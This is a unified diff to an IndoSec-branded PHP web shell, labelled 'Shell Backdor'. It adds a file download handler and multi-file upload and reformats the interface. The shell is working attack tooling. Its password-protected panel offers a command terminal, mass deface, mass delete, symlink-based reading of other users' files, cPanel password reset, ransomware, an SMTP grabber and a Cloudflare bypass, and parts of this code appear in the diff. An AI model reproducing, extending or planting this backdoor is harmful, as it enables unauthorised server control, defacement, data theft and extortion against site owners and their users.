@@ -23,7 +23,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da";   // IndoSec
+$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da";// IndoSec
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
@@ -47,16 +47,14 @@ function login_shell() {
 			<div class="container" style="margin-top: 15%">
 				<div class="col-lg-6">
 					<div class="form-group">
-						<h1 class='text-center'>
-							<a href='https://facebook.com/IndoSecOfficial' style='color:#ffffff;'>{ INDOSEC }
-						</h1>
-						<center><h5>Shell Backdor</a></h5></center>
+						<h1 class="text-center">{ INDOSEC }</h1>
+						<h5 class="text-center pb-5">Shell Backdor</h5>
 						<form method="post">
 							<input type="password" name="pass" placeholder="USER ID" class="form-control"><br/>
 							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
 						</form>
 					</div>
-				</div><br/><a href="https://facebook.com/IndoSecOfficial" class="text-muted">Copyright 2019 @ { IndoSec }</a><br/>
+				</div><a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom">Copyright 2019 @ { IndoSec }</a><br/>
 			</div>
 		</center>
 	</body>
@@ -69,6 +67,19 @@ if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $aut
 	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
 else
 login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
+	@ob_clean();
+	$file = $_GET['file'];
+	header('Content-Description: File Transfer');
+	header('Content-Type: application/octet-stream');
+	header('Content-Disposition: attachment; filename="'.basename($file).'"');
+	header('Expires: 0');
+	header('Cache-Control: must-revalidate');
+	header('Pragma: public');
+	header('Content-Length: ' . filesize($file));
+	readfile($file);
+	exit;
+}
 /*Akhir login*/
 ?>
 <?php
@@ -207,46 +218,70 @@ login_shell();
 		return $return;
 	}
 	
-echo "
+?>
 <html>
 	<head>
-		<meta name='viewport' content='widht=device-widht, initial-scale=1'/>
-		<meta name='author' content='Holiq'/>
-		<meta name='copyright' content='{ IndoSec }'/>
-		<link rel='icon' type='image/png' href='https://www.indsc.me/images/logo.png'/>
+		<meta name="viewport" content="widht=device-widht, initial-scale=1"/>
+		<meta name="author" content="Holiq"/>
+		<meta name="copyright" content="{ IndoSec }"/>
+		<link rel="icon" type="image/png" href="https://www.indsc.me/images/logo.png"/>
 		<title>{ IndoSec sHell }</title>
-		<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css'>
-		<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.2/css/all.css'/>
-		<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'/>
-		<script src='https://code.jquery.com/jquery-3.3.1.js'></script>
-		<script src='https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js'></script>
+		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css"/>
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+		<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
 	</head>
-	<body class='bg-dark text-light'>
+	<body class="bg-dark text-light">
 		<script>
 			$(document).ready(function(){
 				$(window).scroll(function(){
 					if ($(this).scrollTop() > 700) {
-						$('.scrollToTop').fadeIn();
+						$(".scrollToTop").fadeIn();
 					}else{
-						$('.scrollToTop').fadeOut();
+						$(".scrollToTop").fadeOut();
 					}
 				});
-				$('.scrollToTop').click(function(){
-					$('html, body').animate({scrollTop : 0},1000);
+				$(".scrollToTop").click(function(){
+					$("html, body").animate({scrollTop : 0},1000);
 					return false;
 				});
 			});
+			
+			$(document).ready(function() {
+  $('input[type="file"]').on("change", function() {
+ let filenames = [];
+ let files = document.getElementById("customFile").files;
+ if (files.length > 1) {
+filenames.push("Total Files (" + files.length + ")");
+ } else {
+for (let i in files) {
+  if (files.hasOwnProperty(i)) {
+ filenames.push(files[i].name);
+  }
+}
+ }
+ $(this)
+.next(".custom-file-label")
+.html(filenames.join(","));
+  });
+});
+						
+						
 		</script>
 		<style>
 			@import url(https://fonts.googleapis.com/css?family=Lato);
 			@import url(http://fonts.googleapis.com/css?family=Quicksand);
-			body{margin:0;padding:0;font-family:'Lato';}
+			body{margin:0;padding:0;font-family:"Lato";}
 			#tab table thead th{padding:5px;font-size:16px;}
 			#tab tr {border-bottom:1px solid #fff;}
 			#tab tr:hover{background:#5B6F7D; color:#fff;}
 			#tab tr td{padding:5px;}
 			#tab tr td .badge{font-size:13px;}
-			a {font-family:'Quicksand';color:white;}
+			.link,
+			#tab a {color: white;}
+			.active,.active:hover{color:red;}
+			a {font-family:"Quicksand"; color:white;}
 			a:hover{color:dodgerBlue;}
 			.ico {width:25px;}
 			.ico2{width:30px;}
@@ -275,7 +310,7 @@ echo "
 				text-align:center;
 			}
 			.fiture{margin:2px;}
-			.tmp{background:#F4F4F4;color:rgb(153,153,153);}
+			.tmp{background:#F4F4F4;}
 			.tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;}
 			.about{color:#000;}
 			.about .card-body .img{
@@ -293,11 +328,11 @@ echo "
 				-webkit-transition: background 300ms ease, color 300ms ease;
 				transition: background 300ms ease, color 300ms ease;
 			}
-			input[type='radio'].toggle {display:none;}
-			input[type='radio'].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
-			input[type='radio'].toggle + label:after {
+			input[type="radio"].toggle {display:none;}
+			input[type="radio"].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
+			input[type="radio"].toggle + label:after {
 				position: absolute;
-				content: '';
+				content: "";
 				top: 0;
 				background: #fff;
 				height: 100%;
@@ -306,94 +341,97 @@ echo "
 				-webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
 				transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
 			}
-			input[type='radio'].toggle.toggle-left + label:after {left:100%;}
-			input[type='radio'].toggle.toggle-right + label {margin-left:-5px;}
-			input[type='radio'].toggle.toggle-right + label:after {left:-100%;}
-			input[type='radio'].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
-			input[type='radio'].toggle:checked + label:after {left:0;}
+			input[type="radio"].toggle.toggle-left + label:after {left:100%;}
+			input[type="radio"].toggle.toggle-right + label {margin-left:-5px;}
+			input[type="radio"].toggle.toggle-right + label:after {left:-100%;}
+			input[type="radio"].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
+			input[type="radio"].toggle:checked + label:after {left:0;}
 		</style>
-		<nav class='navbar static-top navbar-dark'>
-			<button class='navbar-toggler'type='button' data-toggle='collapse' data-target='#info' aria-label='Toggle navigation'>
-				<i style='color:#fff;' class='fa fa-navicon'></i>
+		<nav class="navbar static-top navbar-dark">
+			<button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation">
+				<i style="color:#fff;" class="fa fa-navicon"></i>
 			</button>
-			<div class='collapse navbar-collapse' id='info'>
+			<div class="collapse navbar-collapse" id="info">
 				<ul>
-					<a href='https://facebook.com/IndoSecOfficial' class='lain'><i class='fa fa-facebook tambah'></i></a>
-					<a href='https://www.instagram.com/indosec.id' class='lain'><i class='fa fa-instagram tambah'></i></a>
-					<a href='https://www.youtube.com/IndoSec' class='lain'><i class='fa fa-youtube-play tambah'></i></a>
-					<a href='https://github.com/indosecid' class='lain'><i class='fa fa-github tambah'></i></a>
-					<a href='https://indosec.web.id' class='lain'><i class='fa fa-globe tambah'></i></a>
+					<a href="https://facebook.com/IndoSecOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
+					<a href="https://www.instagram.com/indosec.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
+					<a href="https://www.youtube.com/IndoSec" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
+					<a href="https://github.com/indosecid" class="lain"><i class="fa fa-github tambah"></i></a>
+					<a href="https://indosec.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
 				</ul>
 			</div>
 		</nav>
-		<div class='container'>
-			<h1 class='text-center'><a href='https://facebook.com/IndoSecOfficial' style='color:#ffffff;'>{ INDOSEC }</h1>
+		<?php
+		echo '
+		<div class="container">
+			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ INDOSEC }</h1>
 			<center><h5>Shell Backdor</a></h5></center>
 			<hr/>
-			<div class='text-center'>
-				<div class='d-flex justify-content-center flex-wrap'>
-					<a href='?' class='fiture btn btn-danger btn-sm'><i class='fa fa-home'></i> Home</a>
-					<a href='?dir=$dir&aksi=upload' class='fiture btn btn-danger btn-sm'><i class='fa fa-upload'></i> Upload</a>
-					<a href='?dir=$dir&aksi=buat_file' class='fiture btn btn-danger btn-sm'><i class='fa fa-plus-circle'></i> Buat File</a>
-					<a href='?dir=$dir&aksi=buat_folder' class='fiture btn btn-danger btn-sm'><i class='fa fa-plus'></i> Buat Folder</a>
-					<a href='?dir=$dir&aksi=masdef' class='fiture btn btn-danger btn-sm'><i class='fa fa-exclamation-triangle'></i> Mass Deface</a>
-					<a href='?dir=$dir&aksi=masdel' class='fiture btn btn-danger btn-sm'><i class='fa fa-trash'></i> Mass Delete</a>
-					<a href='?dir=$dir&aksi=jumping' class='fiture btn btn-danger btn-sm'><i class='fa fa-exclamation-triangle'></i> Jumping</a>
-					<a href='?dir=$dir&aksi=config' class='fiture btn btn-danger btn-sm'><i class='fa fa-cogs'></i> Config</a>
-					<a href='?dir=$dir&aksi=adminer' class='fiture btn btn-danger btn-sm'><i class='fa fa-user'></i> Adminer</a>
-					<a href='?dir=$dir&aksi=symlink' class='fiture btn btn-danger btn-sm'><i class='fa fa-exclamation-circle'></i> Symlink</a>
-					<a href='?dir=$dir&aksi=resetpasscp' class='fiture btn btn-warning btn-sm'><i class='fa fa-key'></i> Auto Reset Cpanel</a>
-					<a href='?dir=$dir&aksi=ransom' class='fiture btn btn-warning btn-sm'><i class='fab fa-keycdn'></i> Ransomware</a>
-					<a href='?dir=$dir&aksi=smtpgrab' class='fiture btn btn-warning btn-sm'><i class='fas fa fa-exclamation-circle'></i> SMTP Grabber</a>
-					<a href='?dir=$dir&aksi=bypascf' class='fiture btn btn-warning btn-sm'><i class='fas fa-cloud'></i> Bypass Cloud Flare</a>
-					<a href='?about' class='fiture btn btn-warning btn-sm'><i class='fa fa-info'></i> About Us</a>
-					<a href='?keluar' class='fiture btn btn-warning btn-sm'><i class='fa fa-sign-out'></i> keluar</a>
+			<div class="text-center">
+				<div class="d-flex justify-content-center flex-wrap">
+					<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
+					<a href="?dir='.$dir.'&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
+					<a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
+					<a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
+					<a href="?dir='.$dir.'&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
+					<a href="?dir='.$dir.'&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
+					<a href="?dir='.$dir.'&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
+					<a href="?dir='.$dir.'&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
+					<a href="?dir='.$dir.'&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
+					<a href="?dir='.$dir.'&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
+					<a href="?dir='.$dir.'&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
+					<a href="?dir='.$dir.'&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
+					<a href="?dir='.$dir.'&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
+					<a href="?dir='.$dir.'&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
+					<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
+					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
 				</div>
 			</div>
-			<div class='row'>
-				<div class='col-lg-4'><br/>
-					<h5><i class='fa fa-terminal'></i>Terminal : </h5>
+			<div class="row">
+				<div class="col-lg-4"><br/>
+					<h5><i class="fa fa-terminal"></i>Terminal : </h5>
 					<form>
-						<input type='text' class='form-control' name='cmd' placeholder='id | uname -a | whoami | heked'>
+						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
 					</form>
-					<hr style='backgroud: white'/>
-					<h5><i class='fa fa-search'></i> Informasi : </h5>
-					<div class='card table-responsive infor'>
-						<div class='card-body' style='color: #333'>
-							<table class='table' style='color: #333'>
+					<hr style="backgroud: white"/>
+					<h5><i class="fa fa-search"></i> Informasi : </h5>
+					<div class="card table-responsive infor">
+						<div class="card-body" style="color: #333">
+							<table class="table" style="color: #333">
 								<tr>
 									<td>PHP</td>
-									<td> : $ver</td>
+									<td> : '.$ver.'</td>
 								</tr>
 								<tr>
 									<td>IP Server</td>
-									<td> : $ip</td>
+									<td> : '.$ip.'</td>
 								</tr>
 								<tr>
 									<td>HDD</td>
-									<td>Total : $total  Free : $free [$used]</td>
+									<td>Total : '.$total.' <br/> Free : '.$free.' ['.$used.']</td>
 								</tr>
 								<tr>
 									<td>Doamin Web</td>
-									<td>: $dom</td>
+									<td>: '.$dom.'</td>
 								</tr>
 								<tr>
 									<td>MySQL</td>
-									<td>: $mysql</td>
+									<td>: '.$mysql.'</td>
 								</tr>
 								<tr>
 									<td>CURL</td>
-									<td>: $curl</td>
+									<td>: '.$curl.'</td>
 								</tr>
 								<tr>
 									<td>Sistem Operasi</td>
-									<td> : $os</td>
+									<td> : '.$os.'</td>
 								</tr>
 							</table>
 						</div>
 					</div>
 				</div>
-			<div class='col-lg-8'><hr/>";
+			<div class="col-lg-8"><hr/>';
+	
 	
 	
 		//cmd
@@ -430,20 +468,29 @@ echo "
 		
 		//upload
 		if ($_GET['aksi'] == 'upload') {
-			echo 
-				"<form method='POST' enctype='multipart/form-data' name='uploader' id='uploader'>
-					<div class='custom-file'>
-						<input type='file' class='custom-file-input' id='cus' name='file'/>
-						<label class='custom-file-label' for='cus'>Pilih File</label>
-					</div><br/><br/>
-					<div class='form-group'>
-						<input class='btn btn-primary btn-sm' type='submit' value='Upload'>
+			echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
+				<div class="container mt-5">
+					<div class="card mr-auto ml-auto">
+						<div class="card-body form-group">
+							<div class="custom-file">
+								<input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
+								<label class="custom-file-label" for="customFile">Choose file</label>
+							</div>
+							<input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
+						</div>
 					</div>
-				</form>";
-		
-			if(isset($_FILES['file'])){
-				if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-					echo '<script>window.location="?dir='.$path.'"; alert("Upload Berhasil");</script>';
+				</div>
+			</form>';
+				
+				
+			if(isset($_POST['upload'])){
+				$countfiles = count($_FILES['file']['name']);
+				for($i=0;$i<$countfiles;$i++){
+					$filename = $_FILES['file']['name'][$i];
+					$uplo = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
+				}
+				if($uplo){
+					echo '<script>alert("Berhasil Upload '.$countfiles.' File");</script>';
 				}else{
 					echo '<script>alert("Gagal Upload!!!");</script>';
 				}
@@ -451,8 +498,8 @@ echo "
 		}
 
 		//openfile
-		if (isset($_GET['dirf'])) {
-			$file = $_GET['dirf'];
+		if (isset($_GET['file'])) {
+			$file = $_GET['file'];
 		}
 			
 		//buat_file
@@ -463,8 +510,8 @@ echo "
 				<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img> Buat File: 
 			</h4>
 			<form method='POST'>
-				<input type='text' class='form-control' name='nama_file' placeholder='Nama File...'><br/>
-				<textarea name='isi_file' class='form-control' rows='3' placeholder='Isi File...'></textarea><br/>
+				<input type='text' class='form-control' name='nama_file' autocomplete='off' placeholder='Nama File...'><br/>
+				<textarea name='isi_file' class='form-control' rows='8' placeholder='Isi File...'></textarea><br/>
 				<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Bikin!!</button><br/>
 			</form>";
 			echo $output;
@@ -486,7 +533,7 @@ echo "
 			View
 		*/
 		if($_GET['aksi'] == 'view') {
-			echo '[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">Lihat</a> ]  [ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  [ <a href="?dir='.$path.'&aksi=hapusf&dirf='.$file.'">Delete</a> ]';
+			echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
 			echo "
 			<textarea rows='9' class='form-control mb-2' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>";
 		}
@@ -496,12 +543,12 @@ echo "
 		*/
 		if($_GET['aksi'] == 'edit') {
 			$nama = basename($file);
-			echo '[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">Lihat</a> ]  [ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  [ <a href="?dir='.$path.'&aksi=hapusf&dirf='.$file.'">Delete</a> ]<hr/><i class="fa fa-edit"> <a href="?dir='.$dir.'&aksi=rename&dirf='.$file.'">Rename</a>';
+			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
 			echo "<form method='POST'>
 				<h5><i class='fa fa-file'></i> Edit File : $nama</h5>
 				<textarea rows='9' class='form-control' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea><br/>
 					<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
-			</form><br/>";
+			</form>";
 			
 			if(isset($_POST['edit_file'])) {
 				$updt = fopen("$file", "w");
@@ -520,12 +567,12 @@ echo "
 		*/
 		if($_GET['aksi'] == 'rename') {
 			$nama = basename($file);
-			echo '[ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Kembali</a> ]';
+			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
 			echo "<form method='POST'>
 				<h5><i class='fa fa-file'></i> Rename File : $nama</h5>
-				<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br/>
-				<button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Update</button><br/>
-			</form><br/>";
+				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Masukan Nama Baru...'><br/>
+				<button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Update</button>
+			</form>";
 		
 			if(isset($_POST['rename_file'])) {
 				$lama = $file;
@@ -548,7 +595,7 @@ echo "
 		*/
 		if ($_GET['aksi'] == 'hapusf') {
 			$nama = basename($file);
-			echo '[ <a href="?dir='.$path.'&aksi=view&dirf='.$file.'">Lihat</a> ]  [ <a href="?dir='.$path.'&aksi=edit&dirf='.$file.'">Edit</a> ]  [ <a href="?dir='.$path.'&aksi=hapusf&dirf='.$file.'">Delete</a> ]';
+			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
 			$output ="
 			<div class='card card-body'>
 				<center><br/>
@@ -578,7 +625,7 @@ echo "
 			$output = "
 			<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img></i> Buat Folder: </h4>
 			<form method='POST'>
-				<input type='text' class='form-control' name='nama_folder' placeholder='Nama Folder...'><br/>
+				<input type='text' class='form-control' name='nama_folder' autocomplete='off' placeholder='Nama Folder...'><br/>
 				<button type='sumbit' class='btn btn-info btn-block' name='buat'>Buat!!</button>
 			</form>";
 			echo $output;
@@ -637,7 +684,7 @@ echo "
 			[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
 			<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img> Rename Folder : $nama </h4>
 			<form method='POST'>
-				<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br/>
+				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Masukan Nama Baru...'><br/>
 				<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button><br/>
 			</form>";
 			echo $output;
@@ -704,7 +751,7 @@ echo "
 					<h5><i class='fa fa-folder'></i> Lokasi :</h5>
 					<input type='text' name='d_dir' value='$dir' class='form-control'><br>
 					<h5><i class ='fa fa-file'></i> Nama File :</h5>
-					<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br>
+					<input type='text' name='d_file' autocomplete='off' placeholder='[Ex] index.php' class='form-control'><br>
 					<input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control'>
 			</form>";
 			}
@@ -756,6 +803,8 @@ echo "
 							if(is_writable($dirc)) {
 								echo "Done > $dirb/$namafile\n";
 								file_put_contents($lokasi, $isi_script);
+							}else{
+								echo "<p>gagal</p>";
 							}
 						}
 					}
@@ -784,9 +833,9 @@ echo "
 				<h5><i class='fa fa-folder'></i> Lokasi :</h5>
 				<input type='text' name='d_dir' value='$dir' class='form-control'><br>
 				<h5><i class ='fa fa-file'></i> Nama File :</h5>
-				<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
+				<input type='text' name='d_file' autocomplete='off' placeholder='[Ex] index.php' class='form-control'><br/>
 				<h5><i class ='fa fa-file'></i> Isi File :</h5>
-				<textarea name='script' class='form-control' rows='5' placeholder='[Ex] Hacked By { IndoSec }'></textarea><br/>
+				<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { IndoSec }'></textarea><br/>
 				<input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
 			</form>";
 		}
@@ -1307,9 +1356,9 @@ echo "
 				fclose($f);
 			}
 			if($w or @filesize('passwd.txt') > 0){
-				echo "<div class='tmp'>
+				echo "<div class='tmp mb-4'>
 					<table width='100%'>
-						<thead class='bg-info'>
+						<thead class='bg-info text-center'>
 							<th>Users</th>
 							<th>symlink</th>
 							<th>FTP</th>
@@ -1319,8 +1368,8 @@ echo "
 						foreach ($fil3 as $f){
 							$u=explode(':', $f);
 							$user = $u['0'];
-							echo "<tr>
-								<td class='left'>$user</td>
+							echo "<tr class='text-dark'>
+								<td class='text-left pl-1'>$user</td>
 								<td>
 									<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
 								</td>
@@ -1561,11 +1610,11 @@ echo "
 		foreach($paths as $id=>$pat){
 			if($pat == '' && $id == 0){
 				$a = true;
-				echo '<a href="?dir=/">/</a>';
+				echo '<a class="link" href="?dir=/">/</a>';
 				continue;
 			}
 			if($pat == '') continue;
-			echo '<a href="?dir=';
+			echo '<a class="link" href="?dir=';
 			for($i=0;$i<=$id;$i++){
 				echo "$paths[$i]";
 				if($i != $id) echo "/";
@@ -1575,8 +1624,8 @@ echo "
 		$scandir = scandir($path);
 		echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
 		echo '<center><div id="tab"><table class="text-white mt-1 table-hover table-responsive">
-			<thead class="bg-info">
-				<th style="width:45%">File/Folder</th>
+			<thead class="bg-info text-center">
+				<th class="text-left">File/Folder</th>
 				<th>Size</th>
 				<th>Permission</th>
 				<th>Action</th>
@@ -1586,8 +1635,8 @@ echo "
 
 			/* cek jika ini berbentuk folder */
 			/* cek jika nama folder karaker terlalu panjang */
-			if (strlen($dir) > 20) {
-				$_dir = substr($dir, 0, 20)."...";												
+			if (strlen($dir) > 18) {
+				$_dir = substr($dir, 0, 18)."...";												
 			}else{
 				$_dir = $dir;
 			}
@@ -1601,7 +1650,7 @@ echo "
 					elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 					echo perms($path.'/'.$dir);
 					if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>
-					<td><center><a title="Rename" class="badge badge-success" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$path.'/'.$dir.'&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
+					<td class=""><center><a title="Rename" class="badge badge-success" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$path.'/'.$dir.'&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
 					</td>
 				';
 		}
@@ -1685,19 +1734,24 @@ echo "
 						$_file = $file;
 					}
 
-					echo' <a href="?dir='.$path.'&aksi=view&dirf='.$path.'/'.$file.'">'.$_file.'</a></td>
-					<td><center>'.$size.'</center></td>
+					echo' <a href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">'.$_file.'</a></td>
+					<td class="text-center d-flex">'.$size.'</td>
 					<td><center>';
 					if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
 					elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
 					echo perms($path.'/'.$file);
 					if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>
-					<td class="text-center"><a title="Lihat" class="badge badge-info" href="?dir='.$path.'&aksi=view&dirf='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Edit" class="badge badge-success" href="?dir='.$path.'&aksi=edit&dirf='.$path.'/'.$file.'">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a class="badge badge-danger" href="?dir='.$path.'&aksi=hapusf&dirf='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
+					<td class="text-center d-flex">
+						<a title="Lihat" class="badge badge-info" href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
+						<a title="Edit" class="badge badge-success" href="?dir='.$path.'&aksi=edit&file='.$path.'/'.$file.'">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
+						<a title="Rename" class="badge badge-success" href="?dir='.$path.'&aksi=rename&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
+						<a class="badge badge-danger" href="?dir='.$path.'&aksi=hapusf&file='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
+						<a class="badge badge-primary" href="?&dir='.$path.'&aksi=download&file='.$path.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
 					</td>
 				</tr>';
 			}
 		echo '</table></div><hr/><a href="https://facebook.com/IndoSecOfficial" class="text-muted">Copyright 2019 { IndoSec }</a></center><br/>';	
-		echo "<a href='' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>";
+		echo "<a href='#' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>";
 	/*  
 		End
 	*/
